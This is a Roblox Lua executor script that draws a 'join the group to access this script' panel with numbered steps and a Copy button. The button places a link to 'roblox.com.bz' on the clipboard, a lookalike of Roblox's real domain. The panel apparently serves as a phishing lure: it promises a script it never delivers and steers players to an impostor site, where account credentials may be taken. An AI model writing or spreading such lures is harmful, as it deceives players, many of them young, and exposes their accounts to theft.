local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TitleLabel = Instance.new("TextLabel")
local Step1Label = Instance.new("TextLabel")
local Step2Label = Instance.new("TextLabel")
local Step3Label = Instance.new("TextLabel")
local Step4Label = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")
local ButtonCorner = Instance.new("UICorner")
local CreatorLabel = Instance.new("TextLabel")

-- Configure ScreenGui
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

-- 1. Configure Main Background Frame (Black)
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Pure Black
Frame.Position = UDim2.new(0.5, -150, 0.5, -160) -- Centered on screen
Frame.Size = UDim2.new(0, 300, 0, 320) -- Height increased to 320 to fit creator text safely
Frame.Active = true
Frame.Draggable = true 

UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

-- 2. Main Header Text
TitleLabel.Parent = Frame
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 10, 0, 15)
TitleLabel.Size = UDim2.new(1, -20, 0, 35)
TitleLabel.Text = "To access this script join the group"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) 
TitleLabel.TextSize = 16
TitleLabel.Font = Enum.Font.SourceSansBold 
TitleLabel.TextWrapped = true

-- 3. Step 1 Text
Step1Label.Parent = Frame
Step1Label.BackgroundTransparency = 1
Step1Label.Position = UDim2.new(0, 10, 0, 60)
Step1Label.Size = UDim2.new(1, -20, 0, 25)
Step1Label.Text = "1. JOIN THE GROUP AND COPY THE LINK"
Step1Label.TextColor3 = Color3.fromRGB(200, 200, 200) 
Step1Label.TextSize = 14
Step1Label.Font = Enum.Font.SourceSansBold 
Step1Label.TextXAlignment = Enum.TextXAlignment.Left

-- 4. Step 2 Text
Step2Label.Parent = Frame
Step2Label.BackgroundTransparency = 1
Step2Label.Position = UDim2.new(0, 10, 0, 90)
Step2Label.Size = UDim2.new(1, -20, 0, 25)
Step2Label.Text = "2. tap join group"
Step2Label.TextColor3 = Color3.fromRGB(200, 200, 200) 
Step2Label.TextSize = 14
Step2Label.Font = Enum.Font.SourceSansBold 
Step2Label.TextXAlignment = Enum.TextXAlignment.Left

-- 5. Step 3 Text
Step3Label.Parent = Frame
Step3Label.BackgroundTransparency = 1
Step3Label.Position = UDim2.new(0, 10, 0, 120)
Step3Label.Size = UDim2.new(1, -20, 0, 25)
Step3Label.Text = "3. reopen the script when you joined the group!"
Step3Label.TextColor3 = Color3.fromRGB(200, 200, 200) 
Step3Label.TextSize = 13 
Step3Label.Font = Enum.Font.SourceSansBold 
Step3Label.TextXAlignment = Enum.TextXAlignment.Left

-- 6. Step 4 Text
Step4Label.Parent = Frame
Step4Label.BackgroundTransparency = 1
Step4Label.Position = UDim2.new(0, 10, 0, 150)
Step4Label.Size = UDim2.new(1, -20, 0, 25)
Step4Label.Text = "4. enjoy the script!"
Step4Label.TextColor3 = Color3.fromRGB(200, 200, 200) 
Step4Label.TextSize = 14
Step4Label.Font = Enum.Font.SourceSansBold 
Step4Label.TextXAlignment = Enum.TextXAlignment.Left

-- 7. Blue Copy Button
CopyButton.Parent = Frame
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255) 
CopyButton.Position = UDim2.new(0.5, -75, 0, 195)
CopyButton.Size = UDim2.new(0, 150, 0, 45)
CopyButton.Text = "Copy"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255) 
CopyButton.TextSize = 18
CopyButton.Font = Enum.Font.SourceSansBold 

ButtonCorner.CornerRadius = UDim.new(0, 6)
ButtonCorner.Parent = CopyButton

-- 8. Creator Credit Text (Small, white, bold at the bottom)
CreatorLabel.Parent = Frame
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Position = UDim2.new(0, 10, 0, 275)
CreatorLabel.Size = UDim2.new(1, -20, 0, 30)
CreatorLabel.Text = "Creator : Jamal567790"
CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Small white text
CreatorLabel.TextSize = 12
CreatorLabel.Font = Enum.Font.SourceSansBold -- Bold Text
CreatorLabel.TextXAlignment = Enum.TextXAlignment.Center

-- 9. Clipboard Functionality
local groupLink = "https://roblox.com.bz/communities/4836715480/" 

CopyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(groupLink)
        CopyButton.Text = "Copied!"
        task.wait(2)
        CopyButton.Text = "Copy"
    else
        CopyButton.Text = "Error: No Clipboard"
    end
end)
